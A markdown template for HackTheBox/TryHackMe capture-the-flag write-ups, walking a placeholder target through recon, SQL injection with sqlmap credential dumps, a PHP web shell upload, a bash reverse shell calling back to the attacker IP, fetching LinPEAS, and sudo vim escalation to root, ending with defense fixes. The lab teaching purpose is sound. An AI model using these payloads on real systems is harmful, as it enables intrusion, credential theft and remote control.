---
title: Writeup Template
published: 2025-05-25
description: Template for writeup
image: https://media.giphy.com/media/YQitE4YNQNahy/giphy.gif
tags: [HackTheBox, TryHackMe, Template]
category: Template
draft: True
---


# <center>🎯 [MACHINE NAME] - HTB/THM Pwned! </center>

<div align="center">

**🏴‍☠️ Platform:** `HTB` / `THM`  
**💀 Box Name:** `[Machine Name]`  
**🎯 IP Address:** `10.10.10.XXX`  
**⚡ Difficulty:** `Easy` / `Medium` / `Hard` / `Insane`  
**🖥️ OS:** `Linux` / `Windows`  
**📅 Pwned Date:** `2024-XX-XX`  
**👤 Author:** `[Your Handle]`  

[![HTB Badge](https://img.shields.io/badge/HTB-Pwned-brightgreen?style=for-the-badge&logo=hackthebox&logoColor=white)](https://hackthebox.com)
[![THM Badge](https://img.shields.io/badge/THM-Complete-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)

</div>

---

## 🚀 TL;DR - The Kill Chain

> <details>
> <summary>💥 Click to expand the mayhem!</summary>
>
> **Initial Access:** Exploited `[vuln type]` on `[service]` → RCE as `[user]`  
> **User Escalation:** Abused `[technique]` → User flag 🏁  
> **Root Escalation:** Exploited `[final technique]` → Root shell 👑  
> **Time to Pwn:** `XX minutes` ⏱️
>
> </details>

---

## 🛠️ Arsenal Deployed

<table>
<tr><td>

**🔍 Recon & Enum**
- `nmap` - Port scanning
- `gobuster` - Directory fuzzing  
- `ffuf` - Parameter fuzzing
- `enum4linux` - SMB enumeration

</td><td>

**💣 Exploitation**
- `burpsuite` - Web app testing
- `sqlmap` - SQL injection
- `metasploit` - Exploit framework
- `nc` - Reverse shells

</td></tr>
<tr><td>

**📈 Privilege Escalation**
- `linpeas` / `winpeas` - Auto enum
- `pspy` - Process monitoring
- `GTFOBins` - Binary exploitation
- Custom scripts 🔥

</td><td>

**🎨 Other Tools**
- `python3` - Custom exploits
- `chisel` - Tunneling
- `bloodhound` - AD mapping
- ☕ Coffee (lots of it)

</td></tr>
</table>

---

## 🎯 Phase 1: Reconnaissance Storm

### 🔥 Nmap Assault

```bash
# 🚀 Initial stealth scan
nmap -sS -sC -sV --top-ports 1000 -T4 -oN nmap_initial.txt 10.10.10.XXX

# 💀 Full port devastation  
nmap -p- --min-rate 10000 -oN nmap_allports.txt 10.10.10.XXX

# 🎯 UDP reconnaissance
sudo nmap -sU --top-ports 100 -oN nmap_udp.txt 10.10.10.XXX
```

<details>
<summary>📊 Click to see scan results</summary>

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    Apache httpd 2.4.41
443/tcp  open  https   Apache httpd 2.4.41
3306/tcp open  mysql   MySQL 5.7.XX
```

</details>

### 🌐 Web App Reconnaissance

```bash
# 🕵️ Directory bruteforcing
gobuster dir -u http://10.10.10.XXX -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak -t 50

# 🎯 Parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.10.10.XXX/page.php?FUZZ=test -fs 1234
```

> **🔥 Hot Findings:**
> - `/admin` - 🚨 Admin panel discovered!
> - `/backup.sql` - 💎 Database backup exposed
> - `/uploads` - 📁 File upload directory
> - Parameter `id` - 💉 SQL injection candidate

---

## 💥 Phase 2: Vulnerability Assessment

### 🎯 Target: SQL Injection on `/search.php`

**🔍 Detection:**
```bash
# Testing for SQLi
curl "http://10.10.10.XXX/search.php?id=1'" 
# Output: MySQL syntax error - BINGO! 💥
```

**💣 Exploitation:**
```bash
# 🚀 Automated exploitation
sqlmap -u "http://10.10.10.XXX/search.php?id=1" --batch --dbs --threads 10

# 💀 Database enumeration
sqlmap -u "http://10.10.10.XXX/search.php?id=1" -D webapp --tables --batch

# 👤 User credentials dump
sqlmap -u "http://10.10.10.XXX/search.php?id=1" -D webapp -T users --dump --batch
```

<details>
<summary>🏆 Credentials Harvested</summary>

| Username | Password Hash | Cracked |
|----------|---------------|---------|
| admin | 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 | `password123` |
| user1 | 482c811da5d5b4bc6d497ffa98491e38 | `welcome` |

</details>

---

## 🚀 Phase 3: Initial Foothold

### 💣 Web Shell Upload

**Strategy:** Exploit file upload vulnerability in admin panel

```bash
# 🎯 Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 🚀 Upload via admin panel
curl -X POST -F "file=@shell.php" http://10.10.10.XXX/admin/upload.php \
     -H "Cookie: PHPSESSID=abc123..."

# 💥 Execute commands
curl "http://10.10.10.XXX/uploads/shell.php?cmd=id"
```

### 🔥 Reverse Shell Time!

```bash
# 🎧 Setup listener
rlwrap nc -nvlp 4444

# 💀 Trigger reverse shell
curl "http://10.10.10.XXX/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.XXX/4444%200%3E%261%27"
```

> **🎉 SUCCESS!** Shell caught as `www-data`

---

## 🧗 Phase 4: Privilege Escalation Journey

### 🔍 System Enumeration

```bash
# 🚀 Deploy LinPEAS
wget http://10.10.14.XXX:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && ./linpeas.sh | tee /tmp/linpeas_output.txt
```

### 🎯 Critical Findings

<table>
<tr><td>

**🔥 SUID Binaries**
```bash
find / -perm -4000 2>/dev/null
```
- `/usr/bin/custom_app` 🚨
- `/usr/bin/find` 
- `/bin/systemctl`

</td><td>

**⚡ Sudo Permissions**
```bash
sudo -l
```
- `(root) NOPASSWD: /usr/bin/vim`
- `(root) /opt/backup.sh`

</td></tr>
</table>

### 💥 Exploitation: Sudo Vim Abuse

```bash
# 🎯 GTFOBins technique
sudo vim -c ':!/bin/bash'

# 👑 ROOT ACHIEVED!
whoami
# root
```

---

## 🏆 Phase 5: Victory Lap

### 🎌 Flag Collection

<details>
<summary>🚩 User Flag</summary>

```bash
cat /home/user/user.txt
# HTB{user_flag_here_xxxxx}
```

</details>

<details>
<summary>👑 Root Flag</summary>

```bash
cat /root/root.txt  
# HTB{root_flag_here_xxxxx}
```

</details>

### 💎 Bonus Loot

- **SSH Keys:** `/root/.ssh/id_rsa` 🔑
- **Database:** Full MySQL dump 💾  
- **Credentials:** Password reuse goldmine 💰

---

## 🧠 Post-Exploitation Analysis

### ✅ What Worked

> - **Systematic enumeration** paid off big time
> - **SQLi to file upload** combo was chef's kiss 👌
> - **LinPEAS** highlighted the sudo misconfiguration instantly

### 🚧 Challenges Faced

> - Initial web shell kept dying (fixed with Python PTY)
> - Red herring with the custom SUID binary
> - Had to stabilize shell multiple times

### 🛡️ Defense Recommendations

| Vulnerability | Fix |
|---------------|-----|
| SQL Injection | Use parameterized queries |
| File Upload | Implement proper validation & sandboxing |
| Sudo Misconfiguration | Remove unnecessary sudo permissions |

---

## 📚 Resources & References

- [GTFOBins](https://gtfobins.github.io/) - Binary exploitation techniques
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Payload repository  
- [HackTricks](https://book.hacktricks.xyz/) - Penetration testing methodologies
- [RevShells](https://www.revshells.com/) - Reverse shell generator

---

<div align="center">

## 🎉 Machine Pwned! 

![Pwned GIF](https://media.giphy.com/media/3ohzdIuqJoo8QdKlnW/giphy.gif)

**⏱️ Total Time:** `XX minutes`  
**🔥 Difficulty Rating:** `X/10`  
**🎯 Learned:** `[Key technique/concept]`

---